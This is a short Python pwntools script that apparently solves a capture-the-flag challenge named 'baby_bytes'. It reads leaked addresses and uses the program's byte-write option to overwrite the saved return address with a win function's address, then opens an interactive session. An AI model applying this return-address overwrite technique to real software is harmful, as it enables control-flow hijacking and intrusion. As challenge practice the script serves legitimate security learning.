from pwn import *

# Set up context for 64-bit
context.binary = 'baby_bytes'
context.terminal = ['tmux', 'splitw', '-h']

# Start process
p = process('./baby_bytes')

# Read the intro lines
p.recvuntil(b"address of choice (pun intended): ")
choice_addr = int(p.recvline().strip(), 16)

p.recvuntil(b"function at this address to win: ")
win_addr = int(p.recvline().strip(), 16)

log.info(f"choice @ {hex(choice_addr)}")
log.info(f"win    @ {hex(win_addr)}")

# We now want to find the return address, which is typically after choice
# Try brute force offset (most likely around 0x28 or 0x30 bytes ahead)

# Guessing offset between &choice and return address
offset = 0x38  # Adjust if needed
ret_addr = choice_addr + offset

log.info(f"Trying to overwrite return address at {hex(ret_addr)}")

# Overwrite return address byte-by-byte
for i in range(8):
    p.sendlineafter(b"choice:", b"2")  # write mode
    p.sendlineafter(b"hex:", hex(ret_addr + i).encode())
    p.sendlineafter(b"to:", bytes([ (win_addr >> (i * 8)) & 0xff ]))

# Let program exit to trigger return
p.sendlineafter(b"choice:", b"3")  # invalid option to exit

# Catch output from win
p.interactive()
